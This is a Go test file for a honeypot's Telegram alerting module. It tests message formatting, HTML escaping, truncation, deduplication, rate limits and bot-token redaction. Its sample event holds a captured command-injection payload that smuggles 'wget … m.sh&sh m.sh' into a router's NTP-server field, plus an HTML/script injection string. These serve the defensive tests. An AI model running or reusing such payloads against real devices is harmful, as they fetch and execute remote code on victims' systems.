package alert

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"sync/atomic"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/generalregulator/botbait/internal/metrics"
	"github.com/generalregulator/botbait/internal/model"
)

func sampleEvent() *model.Event {
	return &model.Event{
		SrcIP: "203.0.113.77", DstPort: 5555, Protocol: "HTTP", Action: "HTTP POST",
		Payload: "POST /UD/act?1 HTTP/1.1\nHost: x\n\n<NewNTPServer1>`cd /tmp;wget http://203.0.113.50/m.sh&sh m.sh`</NewNTPServer1>",
		Geo:     model.Geo{Country: "China", ISP: "China Telecom", ASN: "AS4134", Resolved: true},
		Techniques: []model.Technique{
			{ID: "T1059.004", Name: "Unix Shell"}, {ID: "T1105", Name: "Ingress Tool Transfer"},
			{ID: "T1190", Name: "Exploit Public-Facing Application"},
		},
		IOCs: model.IOCs{
			URLs:         []string{"http://203.0.113.50/m.sh"},
			DownloadURLs: []string{"http://203.0.113.50/m.sh"},
		},
		Downloads: []model.DownloadResult{{
			URL: "http://203.0.113.50/m.sh", Success: true, Status: "Downloaded",
			Filename: "ab12.bin", SHA256: "ab12", Size: 321, FileType: "ELF"}},
	}
}

func TestFormatLayout(t *testing.T) {
	msg := Format(sampleEvent(), 1200)
	for _, want := range []string{
		"🚨\u00a0<b>HONEYPOT ALERT (5555/HTTP)</b>\u00a0🚨\n",
		"🌐 <b>Attacker IP:</b> <code>203.0.113.77</code>\n",
		"🏢 <b>ISP/ASN:</b> <code>China - China Telecom AS4134</code>\n",
		"🏷 <b>MITRE ATT&amp;CK:</b> <code>T1059.004 (Unix Shell), T1105 (Ingress Tool Transfer), T1190 (Exploit Public-Facing Application)</code>\n\n",
		"📦 Parsed Payload Data:\n<pre>[HTTP POST]\n\nPOST /UD/act?1",
		"🎯 Extracted IOCs &amp; Payloads:\n🔗 http://203.0.113.50/m.sh\n📦 SHA256: <code>ab12</code> | 321 B (ELF)",
	} {
		if !strings.Contains(msg, want) {
			t.Errorf("missing %q in:\n%s", want, msg)
		}
	}

	for _, banned := range []string{"ab12.bin", "Saved: ab12", "virustotal", "abuseipdb", "check-host", "<a href"} {
		if strings.Contains(msg, banned) {
			t.Errorf("message must not contain %q:\n%s", banned, msg)
		}
	}
}

func TestButtonsLayout(t *testing.T) {
	kb := Buttons(sampleEvent())
	if len(kb) != 2 || len(kb[0]) != 2 || len(kb[1]) != 1 {
		t.Fatalf("want rows of 2 and 1 buttons, got %+v", kb)
	}
	want := [][]Button{
		{{"🔬 VirusTotal", "https://www.virustotal.com/gui/ip-address/203.0.113.77"},
			{"🛡 AbuseIPDB", "https://www.abuseipdb.com/check/203.0.113.77"}},
		{{"🌐 Check-Host", "https://check-host.net/ip-info?host=203.0.113.77"}},
	}
	if !reflect.DeepEqual(kb, want) {
		t.Fatalf("buttons: %+v", kb)
	}

	ev := sampleEvent()
	ev.SrcIP = "2001:db8::1"
	if u := Buttons(ev)[1][0].URL; u != "https://check-host.net/ip-info?host=2001%3Adb8%3A%3A1" {
		t.Fatalf("ipv6 check-host url: %s", u)
	}
}

func TestFormatEscapesHTML(t *testing.T) {
	ev := sampleEvent()
	ev.Payload = `</pre><a href="http://evil">click</a> & <script>`
	ev.Action = "<b>x</b>"
	msg := Format(ev, 1200)
	if strings.Contains(msg, "<script>") || strings.Contains(msg, "<a href=\"http://evil\">") ||
		strings.Contains(msg, "<b>x</b>") {
		t.Fatalf("unescaped attacker data in message:\n%s", msg)
	}
	if !strings.Contains(msg, "&lt;/pre&gt;&lt;a href=\"http://evil\"&gt;click&lt;/a&gt; &amp; &lt;script&gt;") {
		t.Fatalf("escaping not as expected:\n%s", msg)
	}
}

func TestFormatTruncationRespectsTelegramLimit(t *testing.T) {
	ev := sampleEvent()

	ev.Payload = strings.Repeat("<&>", 20000)
	msg := Format(ev, 3000)
	if n := utf8.RuneCountInString(msg); n > 4096 {
		t.Fatalf("message has %d runes (> 4096)", n)
	}
	if !strings.Contains(msg, "...[TRUNCATED]</pre>") {
		t.Fatal("truncation marker missing")
	}

	body := msg[strings.Index(msg, "<pre>")+5 : strings.Index(msg, "...[TRUNCATED]")]
	for _, ent := range []string{"&am", "&lt", "&gt"} {
		for _, bad := range []string{ent + "<", ent + "."} {
			if strings.Contains(body+"...", bad) && !strings.HasSuffix(body, ent+";") {
				t.Fatalf("broken entity near end of payload: %q", body[len(body)-10:])
			}
		}
	}
	if !strings.HasSuffix(body, ";") && !strings.HasSuffix(body, "<") && !strings.HasSuffix(body, "&") {

		t.Fatalf("payload cut mid-entity: %q", body[len(body)-10:])
	}
}

func TestFormatNoIOCs(t *testing.T) {
	ev := sampleEvent()
	ev.IOCs, ev.Downloads, ev.Techniques, ev.Payload = model.IOCs{}, nil, nil, ""
	msg := Format(ev, 1200)
	if !strings.Contains(msg, "<code>None</code>") || !strings.Contains(msg, "🔗 None") ||
		!strings.Contains(msg, "<pre>[HTTP POST]\n\n(empty)</pre>") {
		t.Fatalf("unexpected:\n%s", msg)
	}
}

func TestFormatFailedDownloadStatus(t *testing.T) {
	ev := sampleEvent()
	ev.Downloads = []model.DownloadResult{{URL: "http://203.0.113.50/m.sh", Status: "Download Failed (Dead Link or Timeout)"}}
	if !strings.Contains(Format(ev, 1200), "📦 Saved: Download Failed (Dead Link or Timeout)") {
		t.Fatal("failure status not shown")
	}
}

func TestNotifySendsDedupesAndRedacts(t *testing.T) {
	var calls atomic.Int32
	var gotPath string
	var got map[string]any
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		calls.Add(1)
		gotPath = r.URL.Path
		b, _ := io.ReadAll(r.Body)
		_ = json.Unmarshal(b, &got)
		w.Write([]byte(`{"ok":true}`))
	}))
	defer srv.Close()

	m := &metrics.Metrics{}
	n := NewNotifier("123:SECRET", "-100", srv.URL, 60, 5, time.Minute, 1200, m, WithCampaignCooldown(0))

	ok, err := n.Notify(context.Background(), sampleEvent())
	if err != nil || !ok {
		t.Fatalf("notify: ok=%v err=%v", ok, err)
	}
	if gotPath != "/bot123:SECRET/sendMessage" || got["parse_mode"] != "HTML" ||
		got["chat_id"] != "-100" || got["disable_web_page_preview"] != true {
		t.Fatalf("bad request: path=%s body=%v", gotPath, got)
	}

	rm, _ := got["reply_markup"].(map[string]any)
	rows, _ := rm["inline_keyboard"].([]any)
	if len(rows) != 2 || len(rows[0].([]any)) != 2 || len(rows[1].([]any)) != 1 {
		t.Fatalf("inline keyboard: %v", got["reply_markup"])
	}
	if b := rows[0].([]any)[0].(map[string]any); b["text"] != "🔬 VirusTotal" || !strings.HasPrefix(b["url"].(string), "https://www.virustotal.com/") {
		t.Fatalf("first button: %v", b)
	}
	if ok, _ := n.Notify(context.Background(), sampleEvent()); ok || calls.Load() != 1 {
		t.Fatal("identical alert must be de-duplicated")
	}
	if m.AlertsDeduplicated.Load() != 1 {
		t.Fatal("dedupe metric not incremented")
	}

	srv.Close()
	ev := sampleEvent()
	ev.SrcIP = "203.0.113.78"
	_, err = n.Notify(context.Background(), ev)
	if err == nil {
		t.Fatal("expected transport error")
	}
	if strings.Contains(err.Error(), "SECRET") {
		t.Fatalf("bot token leaked in error: %v", err)
	}
}

func TestNotifyGlobalRateLimit(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Write([]byte(`{"ok":true}`))
	}))
	defer srv.Close()
	m := &metrics.Metrics{}
	n := NewNotifier("t", "c", srv.URL, 1, 2, time.Hour, 1200, m, WithCampaignCooldown(0))
	sent := 0
	for i := 0; i < 5; i++ {
		ev := sampleEvent()
		ev.SrcIP = "198.51.100." + string(rune('1'+i))
		if ok, _ := n.Notify(context.Background(), ev); ok {
			sent++
		}
	}
	if sent != 2 || m.AlertsRateLimited.Load() != 3 {
		t.Fatalf("sent=%d limited=%d", sent, m.AlertsRateLimited.Load())
	}
}

func TestNotifyHandlesAPIError(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(400)
		w.Write([]byte(`{"ok":false,"description":"Bad Request: can't parse entities"}`))
	}))
	defer srv.Close()
	n := NewNotifier("t", "c", srv.URL, 60, 5, time.Hour, 1200, nil)
	_, err := n.Notify(context.Background(), sampleEvent())
	if err == nil || !strings.Contains(err.Error(), "can't parse entities") {
		t.Fatalf("got %v", err)
	}
}

func okServer(calls *atomic.Int32) *httptest.Server {
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		calls.Add(1)
		w.Write([]byte(`{"ok":true}`))
	}))
}

func TestSameAttackFromSameIPIsAlertedOncePerWindow(t *testing.T) {
	var calls atomic.Int32
	srv := okServer(&calls)
	defer srv.Close()
	n := NewNotifier("t", "c", srv.URL, 600, 50, time.Hour, 1200, nil)
	for i := 0; i < 5; i++ {
		ev := sampleEvent()
		ev.Techniques = nil
		if i%2 == 0 {
			ev.Techniques = sampleEvent().Techniques
		}
		n.Notify(context.Background(), ev)
	}
	if calls.Load() != 1 {
		t.Fatalf("sent %d messages for one repeated attack", calls.Load())
	}
}

func TestSamePayloadFromManyAddressesIsOneCampaignAlert(t *testing.T) {
	var calls atomic.Int32
	srv := okServer(&calls)
	defer srv.Close()
	m := &metrics.Metrics{}
	n := NewNotifier("t", "c", srv.URL, 600, 50, time.Hour, 1200, m)
	for i := 0; i < 6; i++ {
		ev := sampleEvent()
		ev.SrcIP = fmt.Sprintf("203.0.113.%d", 10+i)
		n.Notify(context.Background(), ev)
	}
	if calls.Load() != 1 || m.AlertsDeduplicated.Load() != 5 {
		t.Fatalf("sent=%d deduplicated=%d", calls.Load(), m.AlertsDeduplicated.Load())
	}
	other := sampleEvent()
	other.SrcIP = "198.51.100.7"
	other.IOCs.URLs = []string{"http://198.51.100.99/other.sh"}
	other.IOCs.DownloadURLs = other.IOCs.URLs
	if ok, _ := n.Notify(context.Background(), other); !ok {
		t.Fatal("a different payload must still alert")
	}
}

func TestDedupeWindowsCanBeDisabledAndExpire(t *testing.T) {
	var calls atomic.Int32
	srv := okServer(&calls)
	defer srv.Close()
	n := NewNotifier("t", "c", srv.URL, 600, 50, 0, 1200, nil, WithCampaignCooldown(0))
	n.Notify(context.Background(), sampleEvent())
	n.Notify(context.Background(), sampleEvent())
	if calls.Load() != 2 {
		t.Fatalf("disabled windows must not suppress: %d", calls.Load())
	}
	n = NewNotifier("t", "c", srv.URL, 600, 50, 30*time.Millisecond, 1200, nil, WithCampaignCooldown(30*time.Millisecond))
	calls.Store(0)
	n.Notify(context.Background(), sampleEvent())
	time.Sleep(60 * time.Millisecond)
	n.Notify(context.Background(), sampleEvent())
	if calls.Load() != 2 {
		t.Fatalf("expired window must alert again: %d", calls.Load())
	}
}

func TestFailedDeliveryDoesNotSuppressTheRetry(t *testing.T) {
	var fail atomic.Bool
	fail.Store(true)
	var calls atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		calls.Add(1)
		if fail.Load() {
			w.WriteHeader(500)
			w.Write([]byte(`{"ok":false,"description":"boom"}`))
			return
		}
		w.Write([]byte(`{"ok":true}`))
	}))
	defer srv.Close()
	n := NewNotifier("t", "c", srv.URL, 600, 50, time.Hour, 1200, nil)
	if _, err := n.Notify(context.Background(), sampleEvent()); err == nil {
		t.Fatal("expected an error")
	}
	fail.Store(false)
	if ok, err := n.Notify(context.Background(), sampleEvent()); !ok || err != nil {
		t.Fatalf("retry after a failed delivery was suppressed: ok=%v err=%v", ok, err)
	}
}

func TestRememberedAlertsSurviveARestart(t *testing.T) {
	var calls atomic.Int32
	srv := okServer(&calls)
	defer srv.Close()
	state := filepath.Join(t.TempDir(), "alert-state.json")
	n1 := NewNotifier("t", "c", srv.URL, 600, 50, time.Hour, 1200, nil, WithStateFile(state))
	if ok, _ := n1.Notify(context.Background(), sampleEvent()); !ok {
		t.Fatal("first alert must be sent")
	}
	n2 := NewNotifier("t", "c", srv.URL, 600, 50, time.Hour, 1200, nil, WithStateFile(state))
	if ok, _ := n2.Notify(context.Background(), sampleEvent()); ok || calls.Load() != 1 {
		t.Fatalf("restart repeated an alert (calls=%d)", calls.Load())
	}
	if fi, err := os.Stat(state); err != nil || fi.Mode().Perm() != 0o600 {
		t.Fatalf("state file: %v %v", fi, err)
	}
	if err := os.WriteFile(state, []byte("{broken"), 0o600); err != nil {
		t.Fatal(err)
	}
	n3 := NewNotifier("t", "c", srv.URL, 600, 50, time.Hour, 1200, nil, WithStateFile(state))
	if ok, _ := n3.Notify(context.Background(), sampleEvent()); !ok {
		t.Fatal("a corrupt state file must be ignored")
	}
}

func TestFormatShowsNFSDropperInsteadOfABareIP(t *testing.T) {
	ev := sampleEvent()
	ev.IOCs = model.IOCs{
		IPs: []string{"203.0.113.9"},
		NFS: []string{"203.0.113.9:/var/nfs/files → nfs.sh"},
	}
	ev.Downloads = nil
	out := Format(ev, 1200)
	if !strings.Contains(out, "📂 NFS: 203.0.113.9:/var/nfs/files → nfs.sh") {
		t.Fatalf("NFS line missing:\n%s", out)
	}
	if strings.Contains(out, "🔗 203.0.113.9") || strings.Contains(out, "🔗 None") {
		t.Fatalf("duplicate bare IP or 'None' shown:\n%s", out)
	}
}
